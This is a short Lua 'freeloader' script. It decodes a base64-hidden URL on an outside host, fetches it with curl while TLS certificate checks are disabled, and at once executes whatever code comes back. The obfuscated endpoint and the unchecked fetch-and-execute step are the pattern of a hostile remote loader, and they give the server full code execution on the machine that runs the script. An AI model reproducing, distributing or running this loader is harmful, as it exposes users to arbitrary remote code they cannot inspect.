-- =============================================================
-- 🚀 SCLOUDS-OMNI v12 - FREELOADER
-- =============================================================

local function decode(str)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        return string.char(tonumber(x, 2))
    end))
end

local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")

local pipe = io.popen("curl -sL -k -A '" .. ident .. "' '" .. target .. "'")
if pipe then
    local content = pipe:read("*a")
    pipe:close()
    
    if content and content ~= "" then
        local run, err = (loadstring or load)(content)
        
        if run then
            run() -- Run The Freeloader.sh
        else
            print("\27[31m[ERROR]\27[0m Failed To Load Freeloader.sh: " .. tostring(err))
        end
    else
        print("\27[31m[ERROR]\27[0m Server Respond : Zero.")
    end
end
